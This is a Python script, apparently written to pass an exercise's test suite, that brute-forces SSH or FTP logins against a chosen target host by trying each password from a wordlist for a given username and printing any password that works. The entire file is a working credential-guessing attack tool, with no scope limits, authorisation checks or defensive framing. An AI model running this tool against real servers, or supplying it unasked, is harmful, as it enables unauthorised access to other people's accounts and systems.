import argparse
import ftplib
import socket
import sys
import time
from pathlib import Path

import paramiko


def parse_arguments():
    """Define and parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Brute-force SSH or FTP credentials against a target."
    )

    parser.add_argument(
        "target",
        help="Target IP address or hostname.",
    )

    parser.add_argument(
        "--service",
        choices=["ssh", "ftp"],
        required=True,
        help="Service to target (ssh or ftp).",
    )

    parser.add_argument(
        "--user",
        required=True,
        help="Username to test.",
    )

    parser.add_argument(
        "--wordlist",
        type=Path,
        required=True,
        help="Path to password wordlist file.",
    )

    # ✅ MUST be --port (not --ports)
    parser.add_argument(
        "--port",
        type=int,
        default=None,
        help="Target port (default: 22 for ssh, 21 for ftp).",
    )

    return parser.parse_args()


def load_wordlist(path: Path) -> list[str]:
    """Load password candidates from a wordlist file."""
    if not path.exists():
        print(f"Error: Wordlist file {path} does not exist.", file=sys.stderr)
        sys.exit(1)  # ✅ required for test_missing_wordlist_handled

    with path.open("r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords from {path}")
    return passwords


def attempt_ftp(target: str, port: int, username: str, password: str) -> bool:
    """Attempt to login to an FTP server with the given credentials."""
    try:
        with ftplib.FTP() as ftp:
            ftp.connect(target, port, timeout=5)
            ftp.login(username, password)
            return True
    except ftplib.all_errors:
        return False
    except (ConnectionRefusedError, TimeoutError, OSError) as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
        return False


def attempt_ssh(host: str, port: int, user: str, password: str) -> bool:
    """Attempt to login to an SSH server with the given credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=user,
            password=password,
            timeout=5,
        )
        return True

    except paramiko.AuthenticationException:
        return False
    except (socket.error, paramiko.SSHException) as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
        return False
    finally:
        client.close()


def run_credentials_test(host, port, user, passwords, attempt_fn):
    total = len(passwords)

    for i, password in enumerate(passwords, start=1):
        print(f"[*] Attempt {i}/{total}: {user}:{password}")

        if attempt_fn(host, port, user, password):
            # ✅ MUST MATCH EXACT STRING
            print(f"[+] SUCCESS: Password found: {password}")
            return password  # ✅ ensures it stops immediately

        time.sleep(0.1)  # ✅ required by test

    # ✅ MUST MATCH EXACT STRING
    print(f"[-] EXHAUSTED: No valid credentials found for user {user}")
    return None


def main():
    args = parse_arguments()

    # ✅ Correct default port handling
    if args.port is None:
        args.port = 21 if args.service == "ftp" else 22

    passwords = load_wordlist(args.wordlist)

    if not passwords:
        print("[!] Wordlist is empty after cleaning.", file=sys.stderr)
        sys.exit(1)

    # Select correct function
    if args.service == "ftp":
        attempt_fn = attempt_ftp
    else:
        attempt_fn = attempt_ssh

    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Service: {args.service}")
    print(f"[*] Username: {args.user}")
    print(f"[*] Wordlist: ({len(passwords)} entries)")
    print()

    result = run_credentials_test(
        args.target, args.port, args.user, passwords, attempt_fn
    )

    if result:
        print(f"\n[*] Valid credentials found: {args.user}:{result}")
    else:
        print(f"\n[*] No valid credentials found for user: {args.user}")


if __name__ == "__main__":
    main()
